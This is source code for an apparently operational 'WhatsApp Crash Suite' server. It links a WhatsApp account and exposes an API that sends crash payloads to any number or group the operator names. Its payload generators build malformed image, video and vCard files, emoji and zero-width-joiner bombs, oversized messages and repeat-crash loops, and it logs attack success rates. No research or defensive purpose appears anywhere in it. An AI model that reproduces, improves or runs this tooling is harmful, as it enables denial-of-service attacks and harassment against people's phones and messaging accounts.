'use strict';

// ── MUST BE FIRST: crypto polyfill for Node.js 18 (Baileys signal protocol needs it) ──
if (!globalThis.crypto) {
    const { webcrypto } = require('crypto');
    globalThis.crypto = webcrypto;
}

const express  = require('express');
const path     = require('path');
const http     = require('http');
const socketIo = require('socket.io');
const mongoose = require('mongoose');
const pino     = require('pino');
const {
    makeWASocket,
    DisconnectReason,
    fetchLatestBaileysVersion,
    BufferJSON,
    initAuthCreds,
    proto
} = require('@whiskeysockets/baileys');

const app    = express();
const server = http.createServer(app);
const io     = socketIo(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    path: '/socket.io',
    transports: ['websocket', 'polling'],
    pingTimeout: 60000,
    pingInterval: 25000,
    upgradeTimeout: 30000,
    allowUpgrades: true
});

const PORT = process.env.PORT || 8080;
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// 🍃 MONGODB SCHEMAS
// ============================================================

const authKeySchema = new mongoose.Schema({
    _id:  { type: String },
    data: { type: String }
}, { collection: 'auth_keys' });

const numberSchema = new mongoose.Schema({
    number:    { type: String, unique: true },
    pairedAt:  { type: Date, default: Date.now },
    lastSeen:  { type: Date, default: Date.now },
    status:    { type: String, default: 'active' }
}, { collection: 'paired_numbers' });

const AuthKey      = mongoose.model('AuthKey', authKeySchema);
const PairedNumber = mongoose.model('PairedNumber', numberSchema);

// ============================================================
// 🔐 MONGODB AUTH STATE (replaces useMultiFileAuthState)
// ============================================================

async function useMongoAuthState() {
    const writeData = async (data, key) => {
        const encoded = JSON.stringify(data, BufferJSON.replacer);
        await AuthKey.updateOne({ _id: key }, { $set: { data: encoded } }, { upsert: true });
    };

    const readData = async (key) => {
        const doc = await AuthKey.findOne({ _id: key });
        return doc ? JSON.parse(doc.data, BufferJSON.reviver) : null;
    };

    const removeData = async (key) => {
        await AuthKey.deleteOne({ _id: key });
    };

    const creds = (await readData('creds')) || initAuthCreds();

    return {
        state: {
            creds,
            keys: {
                get: async (type, ids) => {
                    const data = {};
                    await Promise.all(ids.map(async (id) => {
                        let value = await readData(`${type}-${id}`);
                        if (type === 'app-state-sync-key' && value) {
                            value = proto.Message.AppStateSyncKeyData.fromObject(value);
                        }
                        data[id] = value;
                    }));
                    return data;
                },
                set: async (data) => {
                    const tasks = [];
                    for (const category of Object.keys(data)) {
                        for (const id of Object.keys(data[category])) {
                            const value = data[category][id];
                            const key   = `${category}-${id}`;
                            tasks.push(value ? writeData(value, key) : removeData(key));
                        }
                    }
                    await Promise.all(tasks);
                }
            }
        },
        saveCreds: () => writeData(creds, 'creds')
    };
}

// ============================================================
// STATE
// ============================================================

let sock              = null;
let isConnected       = false;
let currentPairingCode = null;
let currentPhoneNumber = null;
let connectionStatus  = 'offline';
const crashLogs       = [];
let mongoReady        = false;

// ============================================================
// 🔌 MONGODB CONNECTION
// ============================================================

async function connectMongo() {
    const uri = process.env.MONGO_URL || process.env.MONGODB_URI;
    if (!uri) {
        console.warn('⚠️  MONGO_URL not set — session will NOT persist across restarts!');
        return false;
    }
    try {
        await mongoose.connect(uri, { serverSelectionTimeoutMS: 8000 });
        console.log('✅ MongoDB connected');
        mongoReady = true;
        return true;
    } catch (e) {
        console.error('❌ MongoDB connection failed:', e.message);
        return false;
    }
}

// ============================================================
// 🔥 WHATSAPP CONNECTION WITH PAIRING CODE
// ============================================================

async function connectToWhatsApp(phoneNumber, socketId) {
    try {
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (cleanNumber.length < 10) throw new Error('Invalid phone number (min 10 digits)');

        if (sock) {
            try { sock.end(); } catch (_) {}
            sock = null;
            isConnected = false;
            currentPairingCode = null;
            connectionStatus = 'offline';
        }

        // ── Auth state: MongoDB if available, else in-memory fallback ──────
        let state, saveCreds;
        if (mongoReady) {
            const mongoState = await useMongoAuthState();
            state     = mongoState.state;
            saveCreds = mongoState.saveCreds;
        } else {
            const { useMultiFileAuthState } = require('@whiskeysockets/baileys');
            const fileState = await useMultiFileAuthState('auth_info_baileys');
            state     = fileState.state;
            saveCreds = fileState.saveCreds;
        }

        let version;
        try {
            const vResult = await fetchLatestBaileysVersion();
            version = vResult.version;
            console.log(`✅ Baileys version: ${version.join('.')}`);
        } catch (e) {
            version = [2, 3000, 1015901307];
            console.warn(`⚠️ fetchLatestBaileysVersion failed (${e.message}), using fallback ${version.join('.')}`);
        }

        sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['WhatsApp Crash Suite', 'Chrome', '120.0.0.0'],
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true,
            printQRInTerminal: false,
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            console.log('🔔 Connection update:', { connection });

            if (connection === 'close') {
                const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
                console.log('⚠️  Connection closed. Reconnect:', shouldReconnect);
                isConnected = false;
                connectionStatus = 'offline';
                currentPairingCode = null;
                io.emit('status_update', { status: 'disconnected' });

                // Update number status in DB
                if (currentPhoneNumber && mongoReady) {
                    await PairedNumber.updateOne(
                        { number: currentPhoneNumber },
                        { $set: { status: 'offline', lastSeen: new Date() } }
                    ).catch(() => {});
                }

                if (shouldReconnect) {
                    setTimeout(() => connectToWhatsApp(phoneNumber, socketId), 5000);
                }
            } else if (connection === 'open') {
                console.log('✅ WhatsApp Connected!');
                isConnected       = true;
                connectionStatus  = 'connected';
                currentPairingCode = null;
                currentPhoneNumber = phoneNumber;
                io.emit('status_update', { status: 'connected', phone: phoneNumber });
                io.emit('connected', { message: '✅ Connected!' });

                // Save/update number in MongoDB
                if (mongoReady) {
                    await PairedNumber.updateOne(
                        { number: phoneNumber },
                        { $set: { status: 'active', lastSeen: new Date() }, $setOnInsert: { pairedAt: new Date() } },
                        { upsert: true }
                    ).catch(() => {});
                    console.log(`💾 Number ${phoneNumber} saved to MongoDB`);
                } else {
                    // File-based: persist phone number for auto-reconnect on restart
                    const fs = require('fs');
                    const authDir = 'auth_info_baileys';
                    if (fs.existsSync(authDir)) {
                        fs.writeFileSync(require('path').join(authDir, '.phone'), phoneNumber);
                    }
                }
            }
        });

        sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg  = messages[0];
            if (!msg.message) return;
            const from = msg.key.remoteJid;
            const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
            if (text.includes('[CRASH-CONFIRM]')) {
                console.log('💀 CRASH CONFIRMED!');
                saveCrashLog(from, 'confirmed');
            }
        });

        // Request pairing code if not yet registered
        if (!state.creds.registered) {
            connectionStatus = 'pairing';
            // Wait for WebSocket to be fully open before requesting pairing code
            await new Promise((resolve) => {
                if (sock.ws && sock.ws.readyState === 1) {
                    resolve();
                } else if (sock.ws) {
                    sock.ws.once('open', resolve);
                    setTimeout(resolve, 5000); // fallback timeout
                } else {
                    setTimeout(resolve, 5000);
                }
            });
            await new Promise(r => setTimeout(r, 1500)); // small buffer after open
            const code = await sock.requestPairingCode(cleanNumber);
            if (!code) throw new Error('Pairing code not received from WhatsApp — try again');
            currentPairingCode = code;
            console.log(`📱 Pairing Code: ${code}`);
            io.emit('pairing_code', { code });
            io.emit('status_update', { status: 'pairing', pairingCode: code });
        }

        return { success: true, pairingCode: currentPairingCode };
    } catch (error) {
        console.error('❌ Connection error:', error.message);
        throw error;
    }
}

// ============================================================
// 📊 CRASH LOGS
// ============================================================

function saveCrashLog(target, status, vector = '', message = '') {
    crashLogs.unshift({ id: Date.now(), target, vector, status, message, time: new Date().toISOString() });
    if (crashLogs.length > 1000) crashLogs.pop();
}

// ============================================================
// 🔥 CRASH VECTORS
// ============================================================

const VECTORS = [
    { id: 'jpeg2000_oom',            name: 'JPEG2000 OOM Crash',       icon: '💀', desc: 'Malformed JPEG2000 → OOM crash',           badge: 'ZERO-CLICK', targetType: 'individual' },
    { id: 'webp_heap_overflow',      name: 'WebP Heap Overflow',        icon: '🧨', desc: 'Malformed WebP → Heap overflow',            badge: 'HEAVY',      targetType: 'individual' },
    { id: 'exif_overflow',           name: 'EXIF Overflow',             icon: '📸', desc: 'EXIF metadata → Parser crash',              badge: 'CRASH',      targetType: 'individual' },
    { id: 'contact_card_crash',      name: 'Contact Card Crash',        icon: '👤', desc: 'vCard parser → Stack overflow',             badge: 'CRASH',      targetType: 'individual' },
    { id: 'gif_crash',               name: 'GIF Parser Crash',          icon: '🎞️', desc: 'Malformed GIF → LZW overflow',             badge: 'ZERO-CLICK', targetType: 'individual' },
    { id: 'video_crash',             name: 'Video Thumbnail Crash',     icon: '🎬', desc: 'Malformed MP4 → Thumbnail crash',           badge: 'HEAVY',      targetType: 'individual' },
    { id: 'emoji_bomb',              name: 'Emoji Bomb',                icon: '😈', desc: 'ZWJ sequences → Renderer hang',            badge: 'HANG',       targetType: 'individual' },
    { id: 'protobuf_oversize',       name: 'Protobuf Oversize',         icon: '📦', desc: '2GB message → OOM crash',                  badge: 'OOM',        targetType: 'individual' },
    { id: 'silent_memory_leak',      name: 'Silent Memory Leak',        icon: '🕳️', desc: 'Background memory leak → Slow kill',       badge: 'INVISIBLE',  targetType: 'individual' },
    { id: 'group_mention_explosion', name: 'Mention Explosion',         icon: '📢', desc: 'Mass @mentions → Group hang',              badge: 'GROUP',      targetType: 'group'      },
    { id: 'group_emoji_bomb',        name: 'Group Emoji Bomb',          icon: '💣', desc: 'Mass emoji → Group renderer crash',        badge: 'GROUP',      targetType: 'group'      },
    { id: 'persistent_loop',         name: 'Persistent Crash Loop',     icon: '♻️', desc: '10× re-crash',                            badge: 'PERSIST',    targetType: 'individual' },
    { id: 'hard_delay',              name: 'Hard Delay Attack',         icon: '⏳', desc: '5-30s delayed re-crash',                  badge: 'PERSIST',    targetType: 'individual' }
];

// ============================================================
// 🧬 PAYLOAD GENERATORS
// ============================================================

function generatePayload(vectorId) {
    const payloads = {
        'jpeg2000_oom': Buffer.from([0xFF,0x4F,0xFF,0x51,0x00,0x2F,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]),
        'webp_heap_overflow': (() => {
            let d = Buffer.concat([Buffer.from('RIFF','ascii'), Buffer.from([0xFF,0xFF,0xFF,0xFF]), Buffer.from('WEBP','ascii'), Buffer.from('VP8X','ascii'), Buffer.from([0xFF,0xFF,0xFF,0xFF]), Buffer.alloc(20,0xFF)]);
            return d;
        })(),
        'exif_overflow': (() => {
            let d = Buffer.from([0xFF,0xD8,0xFF,0xE1,0xFF,0xFF]);
            d = Buffer.concat([d, Buffer.from('EXIF','ascii'), Buffer.from('MM\x00\x2A','ascii'), Buffer.from([0x00,0x00,0x00,0x08,0xFF,0xFF])]);
            for (let i=0;i<65535;i++) d = Buffer.concat([d, Buffer.from([i%255,(i*2)%255,0x00,0x04,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF])]);
            return d;
        })(),
        'contact_card_crash': (() => {
            let v = 'BEGIN:VCARD\nVERSION:3.0\n';
            for (let i=0;i<5000;i++) v += `NESTED:${i}\nBEGIN:VCARD\nFN:Repeated\nEND:VCARD\n`;
            v += 'PHOTO;ENCODING=b:' + 'A'.repeat(100000) + '\n';
            for (let i=0;i<2000;i++) v += `TEL;TYPE=VOICE:+${String(i).padStart(15,'0')}\n`;
            v += 'END:VCARD\n';
            return Buffer.from(v);
        })(),
        'gif_crash': (() => {
            let d = Buffer.concat([Buffer.from('GIF89a','ascii'), Buffer.from([0xFF,0xFF,0xFF,0xFF,0xF7,0x00,0x00])]);
            for (let i=0;i<256;i++) d = Buffer.concat([d, Buffer.from([i%255,(i*2)%255,(i*3)%255])]);
            d = Buffer.concat([d, Buffer.from([0x21,0xF9,0x04,0x00,0xFF,0xFF,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x0F])]);
            for (let i=0;i<50000;i++) d = Buffer.concat([d, Buffer.from([Math.floor(Math.random()*255)])]);
            return Buffer.concat([d, Buffer.from([0x3B])]);
        })(),
        'video_crash': Buffer.concat([Buffer.from([0x00,0x00,0x00,0x18]), Buffer.from('ftypisom','ascii'), Buffer.from([0x00,0x00,0x00,0x01]), Buffer.from('isomiso2avc1','ascii'), Buffer.from([0x00,0x01,0x00,0x00]), Buffer.from('moov','ascii'), Buffer.from([0x00,0x00,0x00,0x6C]), Buffer.from('mvhd','ascii'), Buffer.alloc(24,0xFF)]),
        'emoji_bomb': (() => { let e=''; for(let i=0;i<100;i++){e+='\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67'+'\uD83C\uDFFB'.repeat(100)+'\u200D'.repeat(1000)+'\uD83D\uDC6A'.repeat(100);} return Buffer.from(e); })(),
        'protobuf_oversize':  Buffer.from('A'.repeat(2*1024*1024)),
        'silent_memory_leak': Buffer.from('🕳️ ' + 'A'.repeat(1024*1024)),
        'group_mention_explosion': (() => { let t=''; for(let i=0;i<500;i++){t+=`@user${i} `;if(i%100===0&&i>0)t+='\n';} return Buffer.from(t); })(),
        'group_emoji_bomb': (() => { let e=''; for(let i=0;i<200;i++){e+='\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67'+'\uD83C\uDFFB'.repeat(100)+'\u200D'.repeat(1000)+'\uD83D\uDC6A'.repeat(100)+'\n';} return Buffer.from(e); })(),
        'persistent_loop': (() => { let p=''; for(let i=0;i<50;i++) p+=`♻️ RECRASH_${i} `+'C'.repeat(10000)+'\n'; return Buffer.from(p); })(),
        'hard_delay':      (() => { let p=''; [5,10,15,20,25,30].forEach(d=>p+=`⏳ DELAY_${d}s `+'D'.repeat(10000)+'\n'); return Buffer.from(p); })()
    };
    return payloads[vectorId] || Buffer.from('[CRASH-PAYLOAD]');
}

// ============================================================
// 📡 SOCKET.IO EVENTS
// ============================================================

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.emit('status_update', {
        status: connectionStatus,
        connected: isConnected,
        phone: currentPhoneNumber,
        pairingCode: currentPairingCode
    });

    socket.on('pair', async (data) => {
        const { phoneNumber } = data;
        if (!phoneNumber) { socket.emit('error', { message: 'Phone number required' }); return; }
        try {
            if (sock) {
                try { sock.end(); } catch (_) {}
                sock = null; isConnected = false; currentPairingCode = null; connectionStatus = 'offline';
            }
            // Clear stale auth state so fresh pairing always works
            if (mongoReady) {
                await AuthKey.deleteMany({}).catch(() => {});
            } else {
                const fs = require('fs');
                const authDir = 'auth_info_baileys';
                if (fs.existsSync(authDir)) {
                    fs.rmSync(authDir, { recursive: true, force: true });
                }
            }
            await connectToWhatsApp(phoneNumber, socket.id);
            socket.emit('status_update', { status: 'pairing', pairingCode: currentPairingCode });
        } catch (error) {
            socket.emit('error', { message: error.message });
        }
    });

    socket.on('cancel_pair', () => {
        if (sock && !isConnected) {
            try { sock.end(); } catch (_) {}
            sock = null; currentPairingCode = null; connectionStatus = 'offline';
            console.log('🚫 Pairing cancelled by client');
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
    });
});

// ============================================================
// 📡 HTTP API ROUTES
// ============================================================

app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        connected: isConnected,
        phoneNumber: currentPhoneNumber || null,
        pairingCode: currentPairingCode || null,
        status: connectionStatus,
        mongoReady
    });
});

app.get('/api/pairing-code', (req, res) => {
    res.json(currentPairingCode
        ? { success: true, code: currentPairingCode }
        : { success: false, message: 'No pairing code available' });
});

app.post('/api/disconnect', (req, res) => {
    try {
        if (sock) { try { sock.end(); } catch (_) {} sock = null; }
        isConnected = false; currentPairingCode = null; currentPhoneNumber = null; connectionStatus = 'offline';
        io.emit('status_update', { status: 'offline' });
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ── Numbers saved in MongoDB ──────────────────────────────────────────────────
app.get('/api/numbers', async (req, res) => {
    try {
        if (!mongoReady) return res.json({ success: false, message: 'MongoDB not connected' });
        const numbers = await PairedNumber.find().sort({ pairedAt: -1 }).lean();
        res.json({ success: true, numbers });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.delete('/api/numbers/:number', async (req, res) => {
    try {
        if (!mongoReady) return res.json({ success: false, message: 'MongoDB not connected' });
        await PairedNumber.deleteOne({ number: req.params.number });
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ── Vectors ───────────────────────────────────────────────────────────────────
app.get('/api/vectors', (req, res) => {
    res.json({ success: true, vectors: VECTORS });
});

// ── Execute crash ─────────────────────────────────────────────────────────────
app.post('/api/crash', async (req, res) => {
    const { target, vector } = req.body;
    if (!sock || !isConnected) return res.status(400).json({ success: false, error: 'Not connected to WhatsApp' });
    if (!target)              return res.status(400).json({ success: false, error: 'Target required' });
    const vectorObj = VECTORS.find(v => v.id === vector);
    if (!vectorObj)           return res.status(400).json({ success: false, error: 'Invalid vector' });
    try {
        const jid     = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const payload = generatePayload(vector);
        let result;
        if (['jpeg2000_oom','webp_heap_overflow','exif_overflow','gif_crash','video_crash'].includes(vector)) {
            result = await sock.sendMessage(jid, { image: payload, caption: '[CRASH-CONFIRM]|' + Date.now() });
        } else if (vector === 'contact_card_crash') {
            result = await sock.sendMessage(jid, { contacts: { displayName: 'CRASH', contacts: [{ vcard: payload.toString() }] } });
        } else {
            result = await sock.sendMessage(jid, { text: payload.toString() });
        }
        saveCrashLog(jid, 'sent', vector, `💀 ${vectorObj.name} sent`);
        res.json({ success: true, messageId: result.key.id, vector, vectorName: vectorObj.name, target: jid });
    } catch (error) {
        saveCrashLog(target, 'failed', vector, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ── Session export (for Heroku SESSION_DATA backup) ──────────────────────────
app.get('/api/session', async (req, res) => {
    try {
        if (mongoReady) {
            const keys = await AuthKey.find().lean();
            if (!keys.length) return res.json({ success: false, message: 'No session yet — pair first' });
            const sessionData = Buffer.from(JSON.stringify(keys)).toString('base64');
            res.json({ success: true, session: sessionData });
        } else {
            const fs = require('fs');
            const authDir = 'auth_info_baileys';
            if (!fs.existsSync(authDir)) return res.json({ success: false, message: 'No session yet — pair first' });
            const files = fs.readdirSync(authDir);
            const data = {};
            for (const f of files) {
                data[f] = fs.readFileSync(require('path').join(authDir, f), 'utf8');
            }
            const sessionData = Buffer.from(JSON.stringify(data)).toString('base64');
            res.json({ success: true, session: sessionData });
        }
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ── Session restore from UI (paste SESSION_DATA string directly) ──────────────
app.post('/api/session/restore', async (req, res) => {
    const { session } = req.body;
    if (!session) return res.status(400).json({ success: false, error: 'session string required' });
    try {
        const parsed = JSON.parse(Buffer.from(session, 'base64').toString('utf8'));
        if (mongoReady && Array.isArray(parsed)) {
            await AuthKey.deleteMany({});
            for (const doc of parsed) {
                await AuthKey.updateOne({ _id: doc._id }, { $set: { data: doc.data } }, { upsert: true });
            }
            console.log(`✅ Session restored via UI (${parsed.length} keys)`);
            res.json({ success: true, message: `Session restored (${parsed.length} keys) — click Get Pairing Code to reconnect` });
        } else if (!mongoReady && typeof parsed === 'object') {
            const fs = require('fs');
            const authDir = 'auth_info_baileys';
            if (fs.existsSync(authDir)) fs.rmSync(authDir, { recursive: true, force: true });
            fs.mkdirSync(authDir, { recursive: true });
            for (const [filename, content] of Object.entries(parsed)) {
                fs.writeFileSync(require('path').join(authDir, filename), content);
            }
            console.log(`✅ Session restored via UI (${Object.keys(parsed).length} files)`);
            res.json({ success: true, message: `Session restored (${Object.keys(parsed).length} files) — click Get Pairing Code to reconnect` });
        } else {
            res.status(400).json({ success: false, error: 'Invalid session format' });
        }
    } catch (e) {
        res.status(400).json({ success: false, error: 'Invalid session string — ' + e.message });
    }
});

// ── Logs & Metrics ────────────────────────────────────────────────────────────
app.get('/api/logs', (req, res) => {
    res.json({ success: true, logs: crashLogs.slice(0, 100) });
});

app.get('/api/metrics', (req, res) => {
    const total   = crashLogs.length;
    const success = crashLogs.filter(l => l.status === 'sent' || l.status === 'confirmed').length;
    const failed  = crashLogs.filter(l => l.status === 'failed').length;
    res.json({ success: true, metrics: { total, success, failed, successRate: total > 0 ? ((success/total)*100).toFixed(2)+'%' : '0%' } });
});

// ── Frontend ──────────────────────────────────────────────────────────────────
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// 🚀 START
// ============================================================

// ── SESSION_DATA restore (Heroku restart fix) ─────────────────────────────────
async function restoreSessionFromEnv() {
    const sessionData = process.env.SESSION_DATA;
    if (!sessionData) return;
    try {
        const parsed = JSON.parse(Buffer.from(sessionData, 'base64').toString('utf8'));
        if (mongoReady && Array.isArray(parsed)) {
            for (const doc of parsed) {
                await AuthKey.updateOne({ _id: doc._id }, { $set: { data: doc.data } }, { upsert: true });
            }
            console.log(`✅ Session restored from SESSION_DATA (${parsed.length} keys)`);
        } else if (!mongoReady && typeof parsed === 'object') {
            const fs = require('fs');
            const authDir = 'auth_info_baileys';
            if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
            for (const [filename, content] of Object.entries(parsed)) {
                fs.writeFileSync(require('path').join(authDir, filename), content);
            }
            console.log(`✅ Session restored from SESSION_DATA (${Object.keys(parsed).length} files)`);
        }
    } catch (e) {
        console.error('❌ Failed to restore SESSION_DATA:', e.message);
    }
}

// ── Auto-reconnect on startup (if session already exists) ─────────────────────
async function autoReconnect() {
    let phoneNumber = null;

    try {
        if (mongoReady) {
            // Get most recently active number from MongoDB
            const record = await PairedNumber.findOne(
                { status: { $in: ['active', 'offline'] } },
                {},
                { sort: { lastSeen: -1 } }
            ).lean();
            if (record) phoneNumber = record.number;

            // Also check if auth keys exist
            const keyCount = await AuthKey.countDocuments();
            if (!phoneNumber || keyCount === 0) {
                console.log('ℹ️  No prior session found — skipping auto-reconnect');
                return;
            }
        } else {
            const fs = require('fs');
            const phonePath = require('path').join('auth_info_baileys', '.phone');
            if (!fs.existsSync(phonePath)) {
                console.log('ℹ️  No .phone file found — skipping auto-reconnect');
                return;
            }
            phoneNumber = fs.readFileSync(phonePath, 'utf8').trim();
            if (!fs.existsSync('auth_info_baileys')) {
                console.log('ℹ️  No auth files found — skipping auto-reconnect');
                return;
            }
        }

        if (!phoneNumber) return;

        console.log(`🔄 Auto-reconnecting WhatsApp for ${phoneNumber}...`);
        connectionStatus = 'reconnecting';
        io.emit('status_update', { status: 'reconnecting', phone: phoneNumber });

        await connectToWhatsApp(phoneNumber, 'auto-reconnect');
    } catch (e) {
        console.error('❌ Auto-reconnect failed:', e.message);
        connectionStatus = 'offline';
        io.emit('status_update', { status: 'offline' });
    }
}

connectMongo().then(async () => {
    await restoreSessionFromEnv();
    server.listen(PORT, async () => {
        console.log(`🔥 WhatsApp Crash Suite v4.0 running on port ${PORT}`);
        console.log(`💀 ${VECTORS.length} crash vectors | MongoDB: ${mongoReady ? '✅' : '❌ (set MONGO_URL)'}`);
        // Small delay so socket.io is ready before emitting events
        setTimeout(autoReconnect, 2000);
    });
});
